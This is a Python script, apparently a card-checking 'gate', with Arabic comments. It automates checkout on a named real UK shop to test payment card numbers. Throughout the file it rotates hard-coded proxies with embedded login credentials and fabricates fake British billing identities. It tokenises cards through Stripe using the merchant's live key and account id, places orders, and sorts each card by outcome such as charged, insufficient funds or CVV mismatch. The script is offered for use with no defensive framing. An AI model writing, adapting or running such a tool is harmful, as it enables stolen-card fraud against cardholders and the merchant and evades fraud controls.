# ==================== gatet.py (تم التحديث لموقع Gruum - Stripe Payments) ====================

import requests, json, re, random, sys, os, time, base64, uuid
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import string

# ==================== قائمة البروكسيات ====================
PROXIES_LIST = [
    {'http': 'http://206223:Fyg3NR65@107.172.12.54:8800', 'https': 'http://206223:Fyg3NR65@107.172.12.54:8800'},
    {'http': 'http://206223:Fyg3NR65@107.172.12.5:8800', 'https': 'http://206223:Fyg3NR65@107.172.12.5:8800'},
    {'http': 'http://206223:Fyg3NR65@107.172.12.24:8800', 'https': 'http://206223:Fyg3NR65@107.172.12.24:8800'},
    {'http': 'http://206222:umh2TcPh@69.58.0.4:8800', 'https': 'http://206222:umh2TcPh@69.58.0.4:8800'},
    {'http': 'http://206223:Fyg3NR65@107.172.12.104:8800', 'https': 'http://206223:Fyg3NR65@107.172.12.104:8800'},
    {'http': 'http://206222:umh2TcPh@69.58.0.27:8800', 'https': 'http://206222:umh2TcPh@69.58.0.27:8800'},
    {'http': 'http://206222:umh2TcPh@69.58.0.24:8800', 'https': 'http://206222:umh2TcPh@69.58.0.24:8800'},
    {'http': 'http://206222:umh2TcPh@69.58.0.5:8800', 'https': 'http://206222:umh2TcPh@69.58.0.5:8800'},
    {'http': 'http://206222:umh2TcPh@69.58.0.2:8800', 'https': 'http://206222:umh2TcPh@69.58.0.2:8800'},
    {'http': 'http://206222:umh2TcPh@69.4.93.141:8800', 'https': 'http://206222:umh2TcPh@69.4.93.141:8800'},
    {'http': 'http://206222:umh2TcPh@69.4.93.152:8800', 'https': 'http://206222:umh2TcPh@69.4.93.152:8800'},
    {'http': 'http://206222:umh2TcPh@69.4.93.144:8800', 'https': 'http://206222:umh2TcPh@69.4.93.144:8800'},
    {'http': 'http://206222:umh2TcPh@69.4.93.130:8800', 'https': 'http://206222:umh2TcPh@69.4.93.130:8800'},
    {'http': 'http://206221:8bVhNtgj@85.209.138.187:8800', 'https': 'http://206221:8bVhNtgj@85.209.138.187:8800'},
    {'http': 'http://206221:8bVhNtgj@85.209.138.195:8800', 'https': 'http://206221:8bVhNtgj@85.209.138.195:8800'},
    {'http': 'http://206221:8bVhNtgj@85.209.138.239:8800', 'https': 'http://206221:8bVhNtgj@85.209.138.239:8800'},
    {'http': 'http://206221:8bVhNtgj@85.209.138.210:8800', 'https': 'http://206221:8bVhNtgj@85.209.138.210:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@45.66.238.16:8800', 'https': 'http://206224:8aTKQp6FFA7@45.66.238.16:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@107.175.117.127:8800', 'https': 'http://206224:8aTKQp6FFA7@107.175.117.127:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@107.175.117.95:8800', 'https': 'http://206224:8aTKQp6FFA7@107.175.117.95:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@45.66.238.71:8800', 'https': 'http://206224:8aTKQp6FFA7@45.66.238.71:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@107.175.117.20:8800', 'https': 'http://206224:8aTKQp6FFA7@107.175.117.20:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@45.66.238.22:8800', 'https': 'http://206224:8aTKQp6FFA7@45.66.238.22:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@45.66.238.150:8800', 'https': 'http://206224:8aTKQp6FFA7@45.66.238.150:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@45.66.238.1:8800', 'https': 'http://206224:8aTKQp6FFA7@45.66.238.1:8800'},
    {'http': 'http://206224:8aTKQp6FFA7@107.175.117.83:8800', 'https': 'http://206224:8aTKQp6FFA7@107.175.117.83:8800'},
]

def get_random_proxy():
    return random.choice(PROXIES_LIST)

def clean_html(text):
    if not text:
        return ""
    clean = re.sub(r'<[^>]+>', ' ', text)
    clean = re.sub(r'\s+', ' ', clean)
    return clean.strip().lower()

def extract_reason(text):
    match = re.search(r'reason:\s*(.+?)(?:\.\s|$|<|$)', text, re.IGNORECASE)
    if match:
        return match.group(1).strip()
    return None

def generate_valid_email():
    domains = ['gmail.com', 'outlook.com', 'yahoo.com', 'hotmail.com', 'icloud.com', 'protonmail.com']
    names = ['john', 'peter', 'michael', 'david', 'james', 'robert', 'thomas', 'william', 'daniel', 'paul']
    name1 = random.choice(names)
    name2 = random.choice(names)
    number = random.randint(1, 9999)
    domain = random.choice(domains)
    formats = [f"{name1}.{name2}{number}@{domain}", f"{name1}{number}@{domain}", f"{name1}_{name2}{number}@{domain}"]
    return random.choice(formats).lower()

def generate_uk_data():
    first_names = ['John', 'Peter', 'Michael', 'David', 'James', 'Robert', 'Thomas', 'William', 'Daniel', 'Paul',
                   'Andrew', 'Mark', 'Christopher', 'Matthew', 'Joshua', 'Benjamin', 'Nicholas', 'Joseph', 'Ryan']
    last_names = ['Smith', 'Jones', 'Williams', 'Brown', 'Wilson', 'Taylor', 'Johnson', 'White', 'Martin', 'Anderson']
    
    first = random.choice(first_names)
    last = random.choice(last_names)
    
    postcodes = ['WA4 1DZ', 'SW1A 1AA', 'M1 1AE', 'B1 1TT', 'LS1 1UR', 'G1 1XU', 'EH1 1QQ', 'CF10 1EP', 'NE1 1EE']
    cities = ['London', 'Manchester', 'Birmingham', 'Leeds', 'Glasgow', 'Edinburgh', 'Cardiff', 'Newcastle']
    streets = ['Baker Street', 'Oxford Street', 'King Street', 'Queen Street', 'Church Road', 'High Street', 'Station Road']
    phones = ['07123456789', '07234567890', '07345678901', '07456789012', '07567890123', '07678901234']
    
    street_num = random.randint(1, 200)
    full_address = f"{street_num} {random.choice(streets)}"
    city = random.choice(cities)
    postcode = random.choice(postcodes)
    
    email = generate_valid_email()
    
    return {
        'first_name': first,
        'last_name': last,
        'email': email,
        'phone': random.choice(phones),
        'address_1': full_address,
        'city': city,
        'postcode': postcode,
        'company': random.choice(['Apple', 'Google', 'Microsoft', 'Amazon', 'Facebook']) if random.choice([True, False]) else ''
    }

def ch(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if len(yy) == 2:
        yy = '20' + yy
    
    max_retries = 3
    
    for attempt in range(max_retries):
        proxy = get_random_proxy()
        proxy_ip = proxy['http'].split('@')[-1].split(':')[0] if '@' in proxy['http'] else 'unknown'
        user = generate_user_agent()
        fake_data = generate_uk_data()
        session_id = str(uuid.uuid4())
        correlation_id = str(uuid.uuid4())[:24]
        
        r = requests.session()
        r.proxies = proxy
        r.verify = False
        
        print(f"[*] Attempt {attempt+1}/{max_retries} - Using proxy: {proxy_ip}")
        print(f"[*] Email used: {fake_data['email']}")
        
        SITE_URL = 'https://www.gruum.com'
        PRODUCT_URL = 'https://www.gruum.com/product/eske-storage-carry-tin/'
        CHECKOUT_URL = 'https://www.gruum.com/checkout/'
        AJAX_URL = 'https://www.gruum.com/'
        
        try:
            # ================ 1. ADD TO CART (Stripe via gruum_single_product_add_to_cart) ================
            headers_add = {
                'authority': 'www.gruum.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'origin': SITE_URL,
                'referer': PRODUCT_URL,
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'Connection': 'close',
            }
            
            params_add = {'wc-ajax': 'gruum_single_product_add_to_cart'}
            data_add = {'quantity': '1', 'product_id': '1600448'}
            
            response = r.post(AJAX_URL, params=params_add, headers=headers_add, data=data_add, timeout=20)
            if response.status_code != 200:
                print(f"[!] Add to cart failed with proxy {proxy_ip}, retrying...")
                continue
            
            # ================ 2. CHECKOUT PAGE ================
            headers_checkout = {
                'authority': 'www.gruum.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                'accept-language': 'en-US,en;q=0.9',
                'referer': PRODUCT_URL,
                'user-agent': user,
                'upgrade-insecure-requests': '1',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'Connection': 'close',
            }
            
            response = r.get(CHECKOUT_URL, headers=headers_checkout, timeout=20)
            if response.status_code != 200:
                print(f"[!] Checkout page failed with proxy {proxy_ip}, retrying...")
                continue
            
            # ================ 3. EXTRACT TOKENS AND NONCES ================
            # استخراج update_order_review_nonce
            sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text)
            if not sec:
                sec = '85891d84b9'
            else:
                sec = sec.group(1)
            
            # استخراج checkout nonce
            check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
            if not check:
                check = 'bf10b52fb7'
            else:
                check = check.group(1)
            
            # ================ 4. UPDATE ORDER REVIEW (Stripe) ================
            billing_first = fake_data['first_name']
            billing_last = fake_data['last_name']
            billing_email = fake_data['email']
            billing_phone = fake_data['phone']
            billing_address = fake_data['address_1']
            billing_city = fake_data['city']
            billing_postcode = fake_data['postcode']
            billing_company = fake_data['company']
            
            headers_update = {
                'authority': 'www.gruum.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': SITE_URL,
                'referer': CHECKOUT_URL,
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'Connection': 'close',
            }
            
            params_update = {'wc-ajax': 'update_order_review'}
            
            data_update = f'security={sec}&payment_method=woocommerce_payments&country=GB&state=&postcode=&city=&address=&address_2=&s_country=GB&s_state=&s_postcode=&s_city=&s_address=&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3Dhttps%253A%252F%252Fwww.gruum.com%252Fcart%252F%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D%26wc_order_attribution_utm_creative_format%3D%26wc_order_attribution_utm_marketing_tactic%3D%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fwww.gruum.com%252F%26wc_order_attribution_session_start_time%3D2026-05-23%252008%253A27%253A36%26wc_order_attribution_session_pages%3D5%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3D{user}%26billing_email%3D{billing_email}%26billing_first_name%3D{billing_first}%26billing_last_name%3D{billing_last}%26billing_phone%3D{billing_phone}%26account_password%3D%26sgm_optin%3D1%26billing_country%3DGB%26sgwcav_postcode_lookup%3D%26sgwcav_address_type%3Dbilling%26sgwcav_append_field%3Dcountry%26sgwcav_complete_fields%3D%255B%2522address_1%2522%252C%2522address_2%2522%252C%2522city%2522%252C%2522state%2522%252C%2522postcode%2522%255D%26billing_address_1%3D{billing_address.replace(" ", "+")}%26billing_address_2%3D%26billing_city%3D{billing_city}%26billing_state%3D%26billing_postcode%3D{billing_postcode}%26shipping_country%3DGB%26sgwcav_postcode_lookup%3D%26sgwcav_address_type%3Dshipping%26sgwcav_append_field%3Dcountry%26sgwcav_complete_fields%3D%255B%2522address_1%2522%252C%2522address_2%2522%252C%2522city%2522%252C%2522state%2522%252C%2522postcode%2522%255D%26shipping_first_name%3D%26shipping_last_name%3D%26shipping_company%3D%26shipping_address_1%3D%26shipping_address_2%3D%26shipping_city%3D%26shipping_state%3D%26shipping_postcode%3D%26shipping_method%255B0%255D%3Dflat_rate%253A1%26gruum_shipping_user_selected%3D%26payment_method%3Dwoocommerce_payments%26wc-woocommerce_payments-new-payment-method%3Dtrue%26wc_braintree_paypal_payment_nonce%3D%26wc_braintree_device_data%3D%26wc-braintree-paypal-context%3Dshortcode%26wc_braintree_paypal_amount%3D7.95%26wc_braintree_paypal_currency%3DGBP%26wc_braintree_paypal_locale%3Den_gb%26wc-braintree-paypal-tokenize-payment-method%3Dtrue%26terms%3Don%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252Fcheckout%252F%26cart%255Bb97ad5ced76c1c8c295fee0b96fab900%255D%255Bqty%255D%3D1%26coupon_code%3D%26sgg_cid%3D193575931.1779524948%26sgg_sid%3D1779524947%26sgg_sn%3D1%26sgg_ts%3DJTdCJTIyc3IlMjIlM0ElMjIoZGlyZWN0KSUyMiUyQyUyMnNtJTIyJTNBJTIyKG5vbmUpJTIyJTJDJTIyZHIlMjIlM0ElMjJodHRwcyUzQSUyRiUyRnd3dy5ncnV1bS5jb20lMkZjYXJ0JTJGJTIyJTJDJTIyZGwlMjIlM0ElMjJodHRwcyUzQSUyRiUyRnd3dy5ncnV1bS5jb20lMkYlMjIlN0Q%253D%26sgg_fbc%3D%26sgg_fbp%3Dfb.1.1779524848445.452660124.AQECAQIB&shipping_method%5B0%5D=flat_rate%3A1'
            
            response = r.post(AJAX_URL, params=params_update, headers=headers_update, data=data_update, timeout=20)
            
            # ================ 5. STRIPE TOKENIZATION ================
            # تنسيق رقم البطاقة (إزالة المسافات)
            card_number = n.replace(' ', '')
            
            headers_stripe = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': user,
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
            }
            
            # إضافة مسافات كل 4 أرقام لبطاقة (للتنسيق)
            formatted_card = ' '.join([card_number[i:i+4] for i in range(0, len(card_number), 4)])
            
            data_stripe = f'billing_details[name]={billing_first}+{billing_last}&billing_details[email]={billing_email}&billing_details[phone]={billing_phone}&billing_details[address][city]={billing_city}&billing_details[address][country]=GB&billing_details[address][line1]={billing_address.replace(" ", "+")}&billing_details[address][line2]=&billing_details[address][postal_code]={billing_postcode}&billing_details[address][state]=&type=card&card[number]={formatted_card}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F58d9408f11%3B+stripe-js-v3%2F58d9408f11%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.gruum.com&time_on_page=139866&client_attribution_metadata[client_session_id]={session_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1J5IdF3ELpi&client_attribution_metadata[elements_session_config_id]=37c4bb51-c745-4f0e-9f73-8463111820eb&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=b4b18f58-a598-465e-9a59-7dc1bc8dc8b1ea9b98&muid=cff8716e-6eb6-4881-95ee-e6cccbc24eea3ceb2d&sid=8e04c614-93bd-4e5c-91e6-0f0200c4a57cf1783a&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1KVevl2HOLdFMK8z'
            
            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe, timeout=20)
            try:
                pm_id = response.json()['id']
            except:
                print(f"[!] Stripe tokenization failed with proxy {proxy_ip}, retrying...")
                continue
            
            # ================ 6. FINAL CHECKOUT ================
            headers_final = {
                'authority': 'www.gruum.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': SITE_URL,
                'referer': CHECKOUT_URL,
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'Connection': 'close',
            }
            
            params_final = {'wc-ajax': 'checkout'}
            
            data_final = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fwww.gruum.com%2Fcart%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=&wc_order_attribution_utm_creative_format=&wc_order_attribution_utm_marketing_tactic=&wc_order_attribution_session_entry=https%3A%2F%2Fwww.gruum.com%2F&wc_order_attribution_session_start_time=2026-05-23+08%3A27%3A36&wc_order_attribution_session_pages=7&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&billing_email={billing_email}&billing_first_name={billing_first}&billing_last_name={billing_last}&billing_phone={billing_phone}&sgm_optin=1&billing_country=GB&billing_address_1={billing_address.replace(" ", "+")}&billing_address_2=&billing_city={billing_city}&billing_state=&billing_postcode={billing_postcode}&shipping_country=GB&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&shipping_method%5B0%5D=flat_rate%3A1&gruum_shipping_user_selected=&payment_method=woocommerce_payments&wc-woocommerce_payments-new-payment-method=true&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&cart%5Bb97ad5ced76c1c8c295fee0b96fab900%5D%5Bqty%5D=1&coupon_code=&wcpay-payment-method={pm_id}&wcpay-fraud-prevention-token='
            
            response = r.post(AJAX_URL, params=params_final, headers=headers_final, data=data_final, timeout=20)
            
            # ================ 7. PARSE RESULT (Stripe Responses) ================
            try:
                result_data = json.loads(response.text)
                messages = result_data.get("messages", "")
                full_response = response.text
            except:
                return 'PARSE_ERROR'
            
            clean_messages = clean_html(messages)
            clean_full = clean_html(full_response)
            search_text = clean_messages + " " + clean_full
            
            reason_match = re.search(r'reason:\s*([^\.]+)', search_text)
            reason = reason_match.group(1).strip() if reason_match else None
            
            print(f"[DEBUG] Clean response: {search_text[:300]}")
            
            # ==================== ردود Stripe ====================
            
            # 1. نجاح
            if 'charged' in search_text or 'success' in search_text or 'completed' in search_text or 'approved' in search_text:
                return 'CHARGED'
            
            # 2. رصيد غير كافٍ
            if 'insufficient funds' in search_text or 'insufficient_funds' in search_text:
                return 'INSUFFICIENT FUNDS'
            
            # 3. بطاقة مرفوضة
            if 'card was declined' in search_text or 'declined' in search_text:
                return 'CARD DECLINED'
            
            # 4. رقم بطاقة غير صحيح
            if 'card number is incorrect' in search_text or 'invalid card number' in search_text:
                return 'INVALID CARD NUMBER'
            
            # 5. بطاقة منتهية
            if 'expired card' in search_text or 'card expired' in search_text:
                return 'EXPIRED CARD'
            
            # 6. CVV خطأ
            if 'cvv' in search_text or 'security code is incorrect' in search_text:
                return 'CVV MISMATCH'
            
            # 7. 3D Secure مطلوب
            if '3d secure' in search_text or 'three_d_secure' in search_text or 'requires action' in search_text:
                return '3D SECURE REQUIRED'
            
            # 8. احتيال
            if 'fraud' in search_text or 'risk' in search_text:
                return 'FRAUD'
            
            # 9. خطأ في المعالجة
            if 'processing error' in search_text or 'error processing' in search_text:
                return 'PROCESSING ERROR'
            
            # 10. عنوان غير مطابق
            if 'address' in search_text and 'mismatch' in search_text:
                return 'ADDRESS MISMATCH'
            
            # 11. أي سبب تاني
            if reason and len(reason) < 60:
                return reason.upper()
            
            if clean_messages and len(clean_messages) < 100:
                return clean_messages.title()
            
            return 'DECLINED'
            
        except Exception as e:
            last_error = str(e)[:50]
            print(f"[!] Proxy {proxy_ip} failed: {last_error}")
            if attempt == max_retries - 1:
                return f'PROXY_ERROR: {last_error}'
            continue
    
    return f'PROXY_ERROR: {last_error}'
